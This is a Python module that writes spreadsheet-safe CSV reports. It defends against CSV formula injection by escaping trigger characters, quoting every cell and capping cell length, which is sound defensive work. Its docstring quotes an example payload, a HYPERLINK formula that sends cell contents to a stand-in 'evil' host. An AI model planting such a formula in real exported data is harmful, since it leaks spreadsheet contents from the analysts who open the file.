"""CSV that is safe to open in a spreadsheet (04-security.md section 9).

CSV/formula injection: a spreadsheet treats a cell that starts with ``=``,
``+``, ``-`` or ``@`` (and, in some products, tab or carriage return) as a
formula. Report cells contain attacker-influenced text: service banners,
HTTP headers, DNS records, usernames and user agents in the audit trail. A
banner of ``=HYPERLINK("http://evil/?"&A1,"click")`` would otherwise run in
the analyst's spreadsheet.

Defence (OWASP "CSV Injection"):

* Any cell whose first character, or first character after leading
  whitespace, is a trigger gets a leading apostrophe, which spreadsheets
  treat as "this is text". Full-width look-alikes are included because some
  spreadsheet locales normalise them.
* Every cell is quoted, so embedded commas, quotes and newlines cannot start
  a new cell or row.
* Cells are capped below Excel's 32,767-character limit, so a huge value
  cannot spill into the next cell.
"""

import csv
import io
from collections.abc import Iterable, Sequence

from app.reports.sanitize import clean_text

FORMULA_TRIGGERS = frozenset("=+-@\t\r\n\uff1d\uff0b\uff0d\uff20")
MAX_CELL_CHARS = 32_000


def safe_cell(value: object) -> str:
    text = clean_text(value)
    if len(text) > MAX_CELL_CHARS:
        text = text[: MAX_CELL_CHARS - 1] + "\u2026"
    stripped = text.lstrip(" \t\r\n")
    if text and (text[0] in FORMULA_TRIGGERS or stripped[:1] in FORMULA_TRIGGERS):
        return "'" + text
    return text


def write_csv(header: Sequence[str], rows: Iterable[Sequence[object]]) -> bytes:
    """Render rows as CSV bytes: UTF-8 with a BOM (so Excel detects UTF-8), CRLF, all quoted."""
    buffer = io.StringIO()
    writer = csv.writer(buffer, quoting=csv.QUOTE_ALL, lineterminator="\r\n")
    writer.writerow([safe_cell(h) for h in header])
    for row in rows:
        writer.writerow([safe_cell(cell) for cell in row])
    return buffer.getvalue().encode("utf-8-sig")
